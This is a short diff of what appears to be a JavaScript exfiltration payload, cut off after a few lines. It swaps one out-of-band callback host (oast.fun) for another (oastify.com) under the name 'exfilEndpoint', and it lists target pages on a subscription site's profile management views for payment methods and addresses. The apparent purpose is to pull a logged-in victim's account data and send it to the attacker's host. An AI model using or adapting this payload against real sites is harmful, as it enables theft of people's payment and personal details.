@@ -1,5 +1,5 @@
 (async () => {
-  const exfilEndpoint = "http://d0li5rpon5bt0r3fmp6gukygsu7n3fej6.oast.fun/";
+  const exfilEndpoint = "http://sc8x6e61qbs6lify3ui82ammjdp4dv7jw.oastify.com/";
   const targets = [
     "/Pages/Subscriptions/ProfileManagement.aspx?view=PaymentMethods",
     "/Pages/Subscriptions/ProfileManagement.aspx?view=Address",
